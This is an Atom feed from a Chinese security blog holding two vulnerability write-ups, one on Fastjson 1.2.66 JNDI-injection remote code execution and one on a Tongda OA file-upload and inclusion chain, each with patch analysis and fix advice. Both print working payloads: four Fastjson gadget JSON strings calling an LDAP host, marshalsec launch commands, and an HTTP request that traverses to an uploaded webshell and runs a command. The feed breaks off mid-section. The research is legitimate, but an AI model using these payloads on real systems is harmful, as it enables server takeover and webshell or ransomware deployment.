<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SecurityCN&#39;s blog</title>
  
  <subtitle>感谢您关注SecurityCN(微信公众号:securitycn),本号会发布一些个人学习及研究文章，包括但不限于漏洞分析、漏洞挖掘、代码审计、IOT安全、比赛、培训认证等</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="www.ja0k.com/"/>
  <updated>2020-03-25T01:35:57.921Z</updated>
  <id>www.ja0k.com/</id>
  
  <author>
    <name>扫码关注公众号(SecurityCN)</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【漏洞分析&amp;复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造</title>
    <link href="www.ja0k.com/2020/03/22/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&amp;%E5%A4%8D%E7%8E%B0%E3%80%91Fastjson1.2.66%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0%E5%90%AB4%E4%B8%AAGadget%E5%88%A9%E7%94%A8Poc%E6%9E%84%E9%80%A0/"/>
    <id>www.ja0k.com/2020/03/22/【漏洞分析&amp;复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造/</id>
    <published>2020-03-22T13:11:47.000Z</published>
    <updated>2020-03-25T01:35:57.921Z</updated>
    
    <content type="html"><![CDATA[<p>【漏洞分析&amp;复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造</p><p><img src="/2020/03/22/【漏洞分析&复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造/2020-03-25-00-56-21.png" alt></p><h4 id="一、事件背景"><a href="#一、事件背景" class="headerlink" title="一、事件背景"></a>一、事件背景</h4><p>近日，Fastjson发布了新版本1.2.67新增了autoType黑名单，在1.2.66及之前版本中存在大量通过JNDI注入绕过黑名单限制的而导致远程代码执行漏洞，远程攻击者可以通过构造的攻击代码触发远程代码执行漏洞，最终可以获取到服务器的控制权限。</p><h4 id="二、漏洞信息"><a href="#二、漏洞信息" class="headerlink" title="二、漏洞信息"></a>二、漏洞信息</h4><table><thead><tr><th>漏洞名称</th><th>Fastjson 远程代码执行漏洞</th></tr></thead><tbody><tr><td>CVE编号</td><td>-</td></tr><tr><td>影响范围</td><td>&lt;=1.2.66</td></tr><tr><td>威胁等级</td><td>高危</td></tr><tr><td>公开时间</td><td>2020年3月19日</td></tr></tbody></table><h4 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h4><h5 id="3-1-补丁对比"><a href="#3-1-补丁对比" class="headerlink" title="3.1 补丁对比"></a>3.1 补丁对比</h5><p><img src="/2020/03/22/【漏洞分析&复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造/2020-03-23-17-49-08.png" alt></p><p>通过对比1.2.66和1.2.67版本ParserConfig.java文件中checkautotype类的denyHashCode发现新增了16个黑名单Gadget<br><img src="/2020/03/22/【漏洞分析&复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造/2020-03-24-14-23-46.png" alt></p><p>注：1.2.42版本之前的黑名单是以denyList形式，存在被黑客利用里面Gadget来攻击低版本的fastjson风险，之后版本码中黑名单都是以hashCode的方式存放在源码里，denyHashCode的计算方式略微复杂，增加了攻击门槛。</p><p>jndi注入产生的原因可以归结到以下4点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、lookup参数可控。</span><br><span class="line">2、InitialContext类及他的子类的lookup方法允许动态协议转换</span><br><span class="line">3、lookup查找的对象是Reference类型及其子类</span><br><span class="line">4、当远程调用类的时候默认会在rmi服务器中的classpath中查找，如果不存在就会去url地址去加载类。如果都加载不到就会失败。</span><br></pre></td></tr></table></figure><p>就可以实现远程加载恶意的对象，实现远程代码执行。<br>我们发现存在3种方法，可以通过jndi注入导致远程代码执行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.rmi、通过jndi reference远程调用object方法</span><br><span class="line">2.LDAP 通过序列化对象，JNDI Referene，ldap地址</span><br><span class="line">3.CORBA IOR 远程获取实现类</span><br></pre></td></tr></table></figure><p>可以使用marshalsec-0.0.3-SNAPSHOT-all.jar开启rmi/ldap 调用web服务器中的恶意对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. LDAP 方式</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Calc</span><br><span class="line">2. RMI 方式</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8000/#Calc</span><br></pre></td></tr></table></figure><p>本次将分析已公开的4个Gadget <code>JndiObjectFactory</code>、<code>AnterosDBCPConfig</code> 、<code>CacheJndiTmLookup</code>和<code>JtaTransactionConfig</code></p><p>黑名单里有10几个Gadget，后续慢慢研究</p><h6 id="1-org-apache-shiro-jndi-JndiObjectFactory"><a href="#1-org-apache-shiro-jndi-JndiObjectFactory" class="headerlink" title="1.org.apache.shiro.jndi.JndiObjectFactory"></a>1.org.apache.shiro.jndi.JndiObjectFactory</h6><p>在org.apache.shiro-core-1.5.1.jar 包中<br><img src="/2020/03/22/【漏洞分析&复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造/2020-03-24-22-08-11.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public T getInstance() &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        if(requiredType != null) &#123;</span><br><span class="line">            return requiredType.cast(this.lookup(resourceName, requiredType));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return (T) this.lookup(resourceName);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>resourceName 参数可控<br>poc构造1:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br></pre></td></tr></table></figure><h6 id="2-br-com-anteros-dbcp-AnterosDBCPConfig"><a href="#2-br-com-anteros-dbcp-AnterosDBCPConfig" class="headerlink" title="2. br.com.anteros.dbcp.AnterosDBCPConfig"></a>2. br.com.anteros.dbcp.AnterosDBCPConfig</h6><p>找lookup<br><img src="/2020/03/22/【漏洞分析&复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造/2020-03-24-23-03-19.png" alt><br>getObjectOrPerformJndiLookup</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">private Object getObjectOrPerformJndiLookup(Object object)</span><br><span class="line">&#123;</span><br><span class="line">   if (object instanceof String) &#123;</span><br><span class="line">      try &#123;</span><br><span class="line">         InitialContext initCtx = new InitialContext();</span><br><span class="line">         return initCtx.lookup((String) object);</span><br><span class="line">      &#125;</span><br><span class="line">      catch (NamingException e) &#123;</span><br><span class="line">         throw new IllegalArgumentException(e);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   return object;</span><br></pre></td></tr></table></figure><p>跟一下调用，发现是传递参数为metricRegistry<br>poc构造2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/【漏洞分析&复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造/2020-03-24-23-05-00.png" alt></p><h6 id="3-org-apache-ignite-cache-jta-jndi-CacheJndiTmLookup"><a href="#3-org-apache-ignite-cache-jta-jndi-CacheJndiTmLookup" class="headerlink" title="3. org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup"></a>3. org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</h6><p><img src="/2020/03/22/【漏洞分析&复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造/2020-03-24-23-17-50.png" alt><br>s 的值为列表jndiNames经过iterator().next遍历返回的对象序列再转化为Sting，jndiNames也是可控<br>poc构造3:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br></pre></td></tr></table></figure><h6 id="4-com-ibatis-sqlmap-engine-transaction-jta-JtaTransactionConfig"><a href="#4-com-ibatis-sqlmap-engine-transaction-jta-JtaTransactionConfig" class="headerlink" title="4. com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig"></a>4. com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</h6><p><img src="/2020/03/22/【漏洞分析&复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造/2020-03-24-23-27-43.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public void setProperties(Properties props) throws SQLException, TransactionException &#123;</span><br><span class="line">  String utxName = null;</span><br><span class="line">  try &#123;</span><br><span class="line">    utxName = (String) props.get(&quot;UserTransaction&quot;);</span><br><span class="line">    InitialContext initCtx = new InitialContext();</span><br><span class="line">    userTransaction = (UserTransaction) initCtx.lookup(utxName);</span><br><span class="line">  &#125; catch (NamingException e) &#123;</span><br><span class="line">    throw new SqlMapException(&quot;Error initializing JtaTransactionConfig while looking up UserTransaction (&quot; + utxName + &quot;).  Cause: &quot; + e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UserTransaction参数 可控<br>poc构造4:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h4><p>*本次复现fastsjon 1.2.66版本 为例<br><img src="/2020/03/22/【漏洞分析&复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造/2020-03-24-23-43-27.png" alt><br>第1个：<br>fastjson 受<code>org.apache.shiro.jndi.JndiObjectFactory</code>影响导致RCE<br><img src="/2020/03/22/【漏洞分析&复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造/2020-03-24-23-40-50.png" alt><br>第2个：<br>fastjson 受<code>br.com.anteros.dbcp.AnterosDBCPConfig</code>影响导致RCE<br><img src="/2020/03/22/【漏洞分析&复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造/2020-03-24-23-40-24.png" alt><br>第3个：<br>fastjson 受<code>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</code>影响导致RCE<br><img src="/2020/03/22/【漏洞分析&复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造/2020-03-24-23-37-09.png" alt><br>第4个：<br>fastjson 受<code>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</code>影响导致RCE<br><img src="/2020/03/22/【漏洞分析&复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造/2020-03-24-23-34-17.png" alt></p><h4 id="五、修复建议"><a href="#五、修复建议" class="headerlink" title="五、修复建议"></a>五、修复建议</h4><p>1.官方已发布新版本<br><a href="https://github.com/alibaba/fastjson/releases/tag/1.2.67" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/releases/tag/1.2.67</a><br>2 修复建议<br>Fastjson默认关闭autotype，如果项目中不需要该功能，可以删除以下代码：<br>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</p><h4 id="六、附录"><a href="#六、附录" class="headerlink" title="六、附录"></a>六、附录</h4><h5 id="本次分析及复现的相关工具地址"><a href="#本次分析及复现的相关工具地址" class="headerlink" title="本次分析及复现的相关工具地址"></a>本次分析及复现的相关工具地址</h5><p><a href="https://github.com/SecurityCN/Vulnerability-analysis/tree/master/fastjson" target="_blank" rel="noopener">https://github.com/SecurityCN/Vulnerability-analysis/tree/master/fastjson</a></p><h5 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h5><p>*<a href="https://github.com/alibaba/fastjson/releases" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/releases</a><br>*<a href="https://mp.weixin.qq.com/s/4JzPRolR0cELL5g9bWM_eA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/4JzPRolR0cELL5g9bWM_eA</a><br>*<a href="https://github.com/threedr3am/learnjavabug" target="_blank" rel="noopener">https://github.com/threedr3am/learnjavabug</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;【漏洞分析&amp;amp;复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/03/22/【漏洞分析&amp;复现】Fastjson1.2.66远程代码执行漏洞分析复现含4个Gadget利用Poc构造/
      
    
    </summary>
    
    
      <category term="技术" scheme="www.ja0k.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="代码审计" scheme="www.ja0k.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="安全研究" scheme="www.ja0k.com/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
      <category term="Fastjson" scheme="www.ja0k.com/tags/Fastjson/"/>
    
      <category term="JAVA-Web安全" scheme="www.ja0k.com/tags/JAVA-Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞分析&amp;漏洞复现】通达OA任意文件上传和文件包含漏洞导致RCE分析及复现</title>
    <link href="www.ja0k.com/2020/03/17/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&amp;%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
    <id>www.ja0k.com/2020/03/17/【漏洞分析&amp;漏洞复现】通达OA任意文件上传漏洞分析及复现/</id>
    <published>2020-03-17T15:11:47.000Z</published>
    <updated>2020-03-23T16:23:08.344Z</updated>
    
    <content type="html"><![CDATA[<p>【漏洞分析&amp;漏洞复现】通达OA任意文件上传和文件包含漏洞导致RCE分析及复现<br><img src="/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-19-10-22-41.png" alt></p><table><thead><tr><th>漏洞名称</th><th>通达OA文件包含漏洞</th></tr></thead><tbody><tr><td>CVE编号</td><td>-</td></tr><tr><td>影响范围</td><td>通达OA v11版本</td></tr><tr><td>威胁等级</td><td>高危</td></tr><tr><td>公开时间#### 一、事件背景</td><td></td></tr></tbody></table><p>近日，通达OA在官方论坛发布了紧急通知，提供了针对部分用户反馈遭到勒索病毒攻击的安全加固程序。根据公告，遭受攻击的OA服务器首页被恶意篡改，伪装成OA系统错误提示页面让用户下载安装插件，同时服务器上文件被勒索病毒重命名加密，论坛中有多个用户反馈中招（具体现象为：主页被篡改、站点文件扩展名被修改、并生成一个勒索提示文本文件），论坛地址：<br><a href="http://club.tongda2000.com/forum.php?mod=viewthread&amp;tid=128367&amp;extra=page%3D1" target="_blank" rel="noopener">http://club.tongda2000.com/forum.php?mod=viewthread&amp;tid=128367&amp;extra=page%3D1</a></p><p>通过在v11.3版本的测试发现全版本的任意文件上传漏洞结合v11版本的文件包含漏洞可以造成远程命令执行，默认为System权限，恶意攻击者可以成功上传Webshell后门，并进一步释放勒索病毒，危害较大。</p><h4 id="二、漏洞信息"><a href="#二、漏洞信息" class="headerlink" title="二、漏洞信息"></a>二、漏洞信息</h4><table><thead><tr><th>漏洞名称</th><th>通达OA任意文件上传漏洞</th></tr></thead><tbody><tr><td>CVE编号</td><td>-</td></tr><tr><td>影响范围</td><td>通达OA 2013/2013增强/2015/2016/2017/v11版本</td></tr><tr><td>威胁等级</td><td>高危</td></tr><tr><td>公开时间</td><td>2020年3月13日</td></tr><tr><td>2020年3月13日</td><td></td></tr></tbody></table><h4 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h4><h5 id="3-1-补丁对比"><a href="#3-1-补丁对比" class="headerlink" title="3.1 补丁对比"></a>3.1 补丁对比</h5><p><a href="http://www.tongda2000.com/news/673.php" target="_blank" rel="noopener">http://www.tongda2000.com/news/673.php</a><br><img src="/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-14-06-28.png" alt><br><img src="/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-14-03-16.png" alt></p><p>根据通达官方的修复说明，需要替换MYOA\webroot下的文件<br>下载官方发布的所有版本的补丁分析后发现：<br>2013/2013增强/2015/2016/2017版本的补丁只有1个文件ispirit\im\upload.php；<br>v11版本的的补丁文件与此次漏洞相关的有ispirit\im\upload.php 和ispirit/interface/gateway.php 等多个文件，所以v11 版本同时受2个漏洞的影响，其他版本暂不确定。</p><p>本次分析以通达v11 版本 为例</p><ul><li>注意：通达OA的php文件采用的是zend54 加密，可以使用 SeayDzend工具进行解密，工具下载地址见附录</li></ul><h6 id="补丁1-ispirit-im-upload-php-任意文件上传漏洞"><a href="#补丁1-ispirit-im-upload-php-任意文件上传漏洞" class="headerlink" title="补丁1: ispirit\im\upload.php 任意文件上传漏洞"></a>补丁1: ispirit\im\upload.php 任意文件上传漏洞</h6><p>对比补丁前后发现 主要是为了修复未登录任意上传文件，有2处更改<br>首先第1处，就是关于登陆验证文件’./auth.php’ 的调用<br><img src="/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-14-41-32.png" alt><br>但在upload.php未修复前，有一个if判断如果$P存在且非空就不需要经过auth.php验证即可执行后续代码。利用此处逻辑漏洞可绕过登陆验证直接上传文件。补丁文件中是直接强制include_once ‘./auth.php’; 进行登录验证。<br>第2处，修改是在upload.php中 增加了登录的与数据库中的Session校验</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$time = time();</span><br><span class="line">$sql = &apos;select * from im_recent where ((from_id = \&apos;&apos; . $_SESSION[&apos;LOGIN_UID&apos;] . &apos;\&apos; and to_id = \&apos;&apos; . $DEST_UID . &apos;\&apos;) or (from_id = \&apos;&apos; . $DEST_UID . &apos;\&apos; and to_id = \&apos;&apos; . $_SESSION[&apos;LOGIN_UID&apos;] . &apos;\&apos;)) and type = \&apos;1\&apos;&apos;;</span><br><span class="line">$cursor = exequery(TD::conn(), $sql);</span><br><span class="line">if (0 &lt; mysql_num_rows($cursor)) &#123;</span><br><span class="line">    $sql1 = &apos;UPDATE im_recent SET update_time = \&apos;&apos; . $time . &apos;\&apos; WHERE ((from_id = \&apos;&apos; . $_SESSION[&apos;LOGIN_UID&apos;] . &apos;\&apos; and to_id = \&apos;&apos; . $DEST_UID . &apos;\&apos;) or (from_id = \&apos;&apos; . $DEST_UID . &apos;\&apos; and to_id = \&apos;&apos; . $_SESSION[&apos;LOGIN_UID&apos;] . &apos;\&apos;)) and type = \&apos;1\&apos;&apos;;</span><br><span class="line">    exequery(TD::conn(), $sql1);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $sql2 = &apos;INSERT INTO im_recent (from_id,to_id,update_time,type) VALUES (\&apos;&apos; . $_SESSION[&apos;LOGIN_UID&apos;] . &apos;\&apos;,\&apos;&apos; . $DEST_UID . &apos;\&apos;,\&apos;&apos; . $time . &apos;\&apos;,\&apos;1\&apos;)&apos;;</span><br><span class="line">    exequery(TD::conn(), $sql2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析完补丁之后我们来整体分析下存在漏洞upload.php 文件<br>1.先判断$P 参数是否存在调用Session和 auth登录认证，当$P非空时此处可以绕过auth.php登录验证<br>2.判断$DEST_UID是否为空；其次如果DEST_UID 中存在有<code>,</code>，则通过intval获取整数值；最后当$DEST_UID=0时，UPLOAD_MODE要为2 否接收方ID无效。<br><img src="/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-15-01-40.png" alt><br>3.UPLOAD_MODE 有3种模式，vociemsg\weixunshare\im，其中im是默认模式，<br>$_FILES全局变量大于等于1的时候(就是有文件上传的时候)，会调用<br>upload方法进行处理，这里的文件上传的 name 为name=”ATTACHMENT<br><img src="/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-15-22-49.png" alt></p><ol start="4"><li>跟进inc\utility_file.php 的upload方法,发现有个文件名校验函数is_uploadable<br><img src="/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-16-10-21.png" alt><br>我们看下关于文件后缀名的获取方式，是通过strrpos 函数获取<code>.</code>最后一次出现的位置开始到后面的3个字符串，不能为<code>php</code>,其实黑名单有很多种方式绕过，比如上传后缀名为<code>.phtml</code>，<code>.cpt</code> 等都可以绕过<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function is_uploadable($FILE_NAME)</span><br><span class="line">&#123;</span><br><span class="line">$POS = strrpos($FILE_NAME, &quot;.&quot;);</span><br><span class="line"></span><br><span class="line">if ($POS === false) &#123;</span><br><span class="line">$EXT_NAME = $FILE_NAME;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">if (strtolower(substr($FILE_NAME, $POS + 1, 3)) == &quot;php&quot;) &#123;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$EXT_NAME = strtolower(substr($FILE_NAME, $POS + 1));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h6 id="补丁2：ispirit-interface-gateway-php-文件包含漏洞"><a href="#补丁2：ispirit-interface-gateway-php-文件包含漏洞" class="headerlink" title="补丁2：ispirit/interface/gateway.php 文件包含漏洞"></a>补丁2：ispirit/interface/gateway.php 文件包含漏洞</h6><p>通过对比v11.3版本的补丁中gateway.php前后代码发现 第47行后面，增加了对url地址种的<code>..</code>符号的判断，防止用户读取其他目录文件。<br><img src="/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-17-29-31.png" alt><br>通读修复之前的代码发现，整个流程为foreach循环解析$json，如果$key键等于字符串<code>url</code> ,则$url={$key所对应的值}，如果$url非空则调用 ，且数据中包含’general/‘ or ‘ispirit/‘or ‘module/‘时，就会调用include_once对$url进行包含。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">if ($json) &#123;</span><br><span class="line">$json = stripcslashes($json);</span><br><span class="line">$json = (array) json_decode($json);</span><br><span class="line"></span><br><span class="line">foreach ($json as $key =&gt; $val ) &#123;</span><br><span class="line">if ($key == &quot;data&quot;) &#123;</span><br><span class="line">$val = (array) $val;</span><br><span class="line"></span><br><span class="line">foreach ($val as $keys =&gt; $value ) &#123;</span><br><span class="line">$keys = $value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($key == &quot;url&quot;) &#123;</span><br><span class="line">$url = $val;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($url != &quot;&quot;) &#123;</span><br><span class="line">if (substr($url, 0, 1) == &quot;/&quot;) &#123;</span><br><span class="line">$url = substr($url, 1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ((strpos($url, &quot;general/&quot;) !== false) || (strpos($url, &quot;ispirit/&quot;) !== false) || (strpos($url, &quot;module/&quot;) !== false)) &#123;</span><br><span class="line">include_once $url;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么就可以在url中传入<code>../</code> 进行跨目录，从而可以包含第1个漏洞上传的php文件，造成RCE</p><h4 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h4><p>*本次复现以通达OAv11.3 版本 为例<br>第1个漏洞的Poc的构造需要满足四个条件: P非空、DEST_UID非空且为数字、UPLOAD_MODE为1或2或3、ATTACHMENT的filename后缀名不能为<code>php</code><br>最后构造的Payload如下<br><img src="/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-19-09-41-20.png" alt><br>上传了1个文件名为<code>a.phtml</code>的php文件 绕过黑名单检测<br>路径为 attach/im/2003/72566742.a.phtml  但该目录不在webroot下不能直接执行webshell，才需要利用后面的文件包含漏洞跨目录解析<br><img src="/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-19-09-35-20.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /ispirit/interface/gateway.php HTTP/1.1</span><br><span class="line">Host: 192.168.80.1:8000</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie:PHPSESSID=pr7a35d0sh8gheukb4mg6990h4;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 70</span><br><span class="line"></span><br><span class="line">json=&#123;&quot;url&quot;:&quot;module/../../attach/im/2003/72566742.a.phtml&quot;&#125;&amp;cmd=whoami</span><br></pre></td></tr></table></figure><p>最后RCE成功，有一点需要提醒下，通达OA开启了 disable_funcation 功能 很多常见的命令执行函数如 exec、eval、system等都被禁止了，需要bypass<br>想学习绕过的可以参考：<br><code>https://www.cnblogs.com/-qing-/p/10944118.html</code></p><h4 id="五、修复建议"><a href="#五、修复建议" class="headerlink" title="五、修复建议"></a>五、修复建议</h4><p>官方提供了以下可能受到影响的版本的补丁：<br>2013版、2013增强版、2015版、2016版、2017版、V11版本<br>下载地址：</p><figure class="highlight plain"><table><tr><td 